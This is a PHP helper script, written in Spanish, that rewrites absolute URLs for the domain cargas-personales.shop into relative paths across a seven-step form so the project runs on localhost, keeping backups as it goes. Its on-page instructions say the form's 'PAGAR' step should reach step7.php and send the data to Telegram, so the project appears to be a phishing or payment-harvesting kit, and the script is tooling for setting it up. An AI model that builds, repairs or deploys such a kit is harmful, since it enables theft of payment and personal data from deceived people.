<?php
/**
 * ARREGLAR URLs - Ejecuta este archivo UNA VEZ
 * http://localhost/personal-flow/www.cargas-personales.shop/arreglar-urls.php
 */

echo "<h1>🔧 Arreglando URLs en todos los archivos</h1>";
echo "<hr>";

$directorio = __DIR__;
$archivos_a_revisar = ['index.html', 'step2.php', 'step3.php', 'step4.php', 'step5.php', 'step6.php', 'step7.php'];

// URLs a buscar y reemplazar
$urls_a_arreglar = [
    'https://www.cargas-personales.shop/' => '',
    'http://www.cargas-personales.shop/' => '',
    'https://cargas-personales.shop/' => '',
    'http://cargas-personales.shop/' => '',
];

$cambios_totales = 0;

echo "<h3>📁 Directorio de trabajo:</h3>";
echo "<p><code>$directorio</code></p>";
echo "<hr>";

foreach ($archivos_a_revisar as $archivo) {
    $ruta = $directorio . '/' . $archivo;
    
    if (!file_exists($ruta)) {
        echo "<p>⚠️ <strong>$archivo</strong> - No existe, saltando...</p>";
        continue;
    }
    
    $contenido = file_get_contents($ruta);
    $contenido_original = $contenido;
    $cambios_archivo = 0;
    
    // Buscar y reemplazar todas las variantes
    foreach ($urls_a_arreglar as $buscar => $reemplazar) {
        $antes = $contenido;
        $contenido = str_replace($buscar, $reemplazar, $contenido);
        $cambios = substr_count($antes, $buscar);
        $cambios_archivo += $cambios;
        
        if ($cambios > 0) {
            echo "<small>  - Reemplazadas $cambios instancias de '$buscar'</small><br>";
        }
    }
    
    if ($cambios_archivo > 0) {
        // Hacer backup
        $backup = $ruta . '.backup';
        copy($ruta, $backup);
        
        // Guardar archivo modificado
        file_put_contents($ruta, $contenido);
        echo "<p>✅ <strong>$archivo</strong> - $cambios_archivo URLs arregladas (backup guardado)</p>";
        $cambios_totales += $cambios_archivo;
    } else {
        echo "<p>ℹ️ <strong>$archivo</strong> - Ya estaba correcto o no existe</p>";
    }
}

echo "<hr>";
echo "<h2>✅ PROCESO COMPLETADO</h2>";
echo "<p><strong>Total de URLs arregladas:</strong> $cambios_totales</p>";

if ($cambios_totales > 0) {
    echo "<div style='background: #d4edda; padding: 20px; border-left: 4px solid #28a745; margin: 20px 0;'>";
    echo "<h3>🎉 ¡Listo!</h3>";
    echo "<p><strong>Se hicieron $cambios_totales cambios</strong></p>";
    echo "<p>Ahora prueba tu formulario:</p>";
    echo "<ol>";
    echo "<li>Ve a: <a href='index.html' target='_blank'>index.html</a></li>";
    echo "<li>Completa el formulario paso a paso</li>";
    echo "<li>Ahora DEBE quedarse en localhost (personal-flow)</li>";
    echo "<li>Al dar 'PAGAR' debe ir a step7.php y enviar a Telegram</li>";
    echo "</ol>";
    echo "<p><strong>📋 Backups creados:</strong></p>";
    echo "<p>Si algo sale mal, los archivos originales están guardados como .backup</p>";
    echo "</div>";
} else {
    echo "<div style='background: #fff3cd; padding: 20px; border-left: 4px solid #ffc107;'>";
    echo "<h3>⚠️ No se encontraron URLs para cambiar</h3>";
    echo "<p>Posibles razones:</p>";
    echo "<ul>";
    echo "<li>Los archivos ya fueron modificados anteriormente</li>";
    echo "<li>Los archivos tienen URLs diferentes</li>";
    echo "<li>Los archivos no existen en este directorio</li>";
    echo "</ul>";
    echo "<p><strong>Revisa manualmente:</strong></p>";
    echo "<ol>";
    echo "<li>Abre index.html con un editor de texto</li>";
    echo "<li>Busca 'action=' en el código</li>";
    echo "<li>Verifica que diga solo 'step2.php' (sin http:// ni dominio)</li>";
    echo "</ol>";
    echo "</div>";
}

echo "<hr>";
echo "<h3>📋 Archivos revisados:</h3>";
echo "<ul>";
foreach ($archivos_a_revisar as $archivo) {
    $ruta = $directorio . '/' . $archivo;
    $existe = file_exists($ruta);
    $icono = $existe ? '✅' : '❌';
    $size = $existe ? filesize($ruta) . ' bytes' : 'No existe';
    echo "<li>$icono <strong>$archivo</strong> - $size</li>";
}
echo "</ul>";

echo "<hr>";
echo "<h3>🔍 Ejemplo de cambios realizados:</h3>";
echo "<pre style='background: #f5f5f5; padding: 15px; border-left: 3px solid #00a8e1;'>";
echo "ANTES:\n";
echo '&lt;form action="https://www.cargas-personales.shop/step2.php" method="POST"&gt;' . "\n\n";
echo "DESPUÉS:\n";
echo '&lt;form action="step2.php" method="POST"&gt;';
echo "</pre>";
?>